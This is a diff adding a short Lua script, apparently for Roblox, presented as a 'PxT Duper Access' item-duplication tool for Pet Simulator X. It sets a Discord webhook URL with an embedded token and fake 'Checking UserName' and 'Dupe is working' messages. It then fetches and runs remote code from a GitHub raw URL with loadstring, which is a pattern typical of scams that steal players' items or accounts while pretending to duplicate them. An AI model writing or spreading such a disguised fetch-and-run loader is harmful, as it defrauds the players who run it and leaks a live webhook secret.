@@ -1,0 +1,9 @@
+Username = "TONOY_TALK"
+WebHook = "https://discord.com/api/webhooks/1070742922577842317/YzCGPYvu6E4aXmhlznbBjO1x7XAD2bzMHQQyq9pxTvC-1XWzjQCnpcgptfqhcNLyXmKm"
+
+_G.CustomScriptName = "PxT Duper Access"
+_G.Text1 = "https://discord.gg/Y22uSDdX7j..."
+_G.Text2 = "Checking UserName"
+_G.Text3 = "Codes:PxTjhshigchifajkhm..."
+_G.Text4 = "Dupe is working Wait 5s To Dupe And Rejoin..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
